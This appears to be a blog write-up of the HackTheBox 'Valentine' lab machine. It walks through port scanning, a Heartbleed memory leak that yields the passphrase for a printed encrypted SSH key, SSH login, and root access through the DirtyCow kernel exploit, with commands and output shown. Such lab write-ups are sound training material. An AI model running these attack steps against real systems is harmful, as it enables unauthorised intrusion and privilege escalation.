---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-09
date: 2018-03-09
title: Writeup Hackthebox - Valentine
tags: [hackthebox]
mathjax: false
imagefeature: 
description: Writeup Hackthebox - Valentine
category: Hackthebox
chart: null
---


## Machine Detail
**Name :** Valentine<br>
**IP :** 10.10.10.79<br>
**Author :** mrb3n<br>
**Hostname :** valentine.htb<br>
**OS :** Linux<br>

## Discovery
first, use nmap to find what services available 
`nmap -sS 10.10.10.79 -v`

```
Discovered open port 22/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
```

### Port 80
I try to open the website in port 80 and just got simple web page with 1 images
then we bruteforce the directory and filename using wordlist from dirbuster to find usefull file.

```
---- Scanning URL: http://10.10.10.79/ ----
+ http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)
+ http://10.10.10.79/decode (CODE:200|SIZE:552)
==> DIRECTORY: http://10.10.10.79/dev/
+ http://10.10.10.79/encode (CODE:200|SIZE:554)
+ http://10.10.10.79/index (CODE:200|SIZE:38)
+ http://10.10.10.79/index.php (CODE:200|SIZE:38)
+ http://10.10.10.79/server-status (CODE:403|SIZE:292)
```

at this folder http://10.10.10.79/dev/ we found couple of interesting files `notes.txt` and `hype_key`

```
Content of notes.txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

The idea i got from notes.txt is the encode/decode is not fully fixed, 
so maybe have couples of vulnerability issue, after that i trying to fuzzing the input in decode and encode
if i could guess the `decode.php` and `encode.php` maybe look like this

```php
/*decode.php*/
<?php
    echo base64_decode($_POST['text']);
?>

/*encode.php*/
<?php
    echo base64_encode($_POST['text']);
?>
```

so there is no way to get vulnerability there, the function looks safe,
lets move into another file is `hype_key` 

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

this file encrypted with `AES-128-CBC` algorithm so we need to find
the password somehow, i didn't get anything by trying to bruteforce with
common wordlist and i looking for another approach.

### Port 22

the ssh service using this version `SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10` and
I did not found exploit for this SSH Version

### Port 443

for this port SSL i try to scan using sslscan
```
•% ➜ sslscan 10.10.10.79
Version: 1.11.11-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 10.10.10.79

Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 vulnerable to heartbleed
TLS 1.1 vulnerable to heartbleed
TLS 1.0 vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
...snip... 
```
so this is vulnerable to heartbleed lets use this [heartbleed.py](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py)

`python ~/Tools/other_tools/heartbleed.py 10.10.10.79  -n 100 -a out`
i start to view the result and trying to decode all base64 there, and until i got this
base64 `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` which is decoded to
```
echo -n "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" |base64 -d
heartbleedbelievethehype
```

## Gaining Access

I try to decrypt the file `hype_key` using `heartbleedbelievethehype` as a passphrase

```
•% ➜ ssh-keygen -y -f hype_key
Enter passphrase:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUU3iZcDCfeCCIML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgkykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1Uma
N3dN6bLL541LNpTscE4RbNzPhP6pD5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N4Yro1xe1RF8uC5
8i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKDb7CBEkzN
``` 

and i got `ssh-rsa` but the missing information here is who is the user of this ssh key ?
and i just trying every possibilies username `admin,root,heart,bleed,hype,coffe,research,dev` i try all of those and just getting the shell with `hype` username

```
•% ➜ ssh hype@10.10.10.79 -i hype_key
Enter passphrase for key 'hype_key':
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:16:34 2018 from 10.10.14.3
hype@Valentine:~$ ls -la Desktop/
total 12
drwxr-xr-x  2 hype hype 4096 Dec 13 11:11 .
drwxr-xr-x 21 hype hype 4096 Feb  5 16:41 ..
-rw-rw-r--  1 hype hype   33 Dec 13 16:54 user.txt
hype@Valentine:~$ cat ~/Desktop/user.txt
e6710a5464[REDACTED]6e076961750
```

after logged in to ssh we found user txt in Desktop folder 


## Privilege Escalation

We need to get information from this system like the permission file/folder
or Binary SUID and Check the Kernel if there was local exploit in wild.

`uname -a => Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux`

the kernel look like old enough and this kernel would have local exploit released

-   running linux exploit suggester

```
  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 3.2.0
  Searching among 70 exploits...

  Possible Exploits:
[+] dirty_cow
     CVE-2016-5195
     Source: https://www.exploit-db.com/exploits/40616/
[+] msr
     CVE-2013-0268
     Source: http://www.exploit-db.com/exploits/27297/
[+] perf_swevent
     CVE-2013-2094
     Source: http://www.exploit-db.com/download/26131
```

I could get root by using dirtycow exploit `CVE-2016-5195` :D

```

hype@Valentine:~/Pictures$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 42824
Racing, this may take a while..
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
thread stopped
root@Valentine:/home/hype/Pictures# id
uid=0(root) gid=1000(hype) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
root@Valentine:/home/hype/Pictures# cat /root/root.txt
f1bb6d759[REDACTED]bc9ed7765b2
```





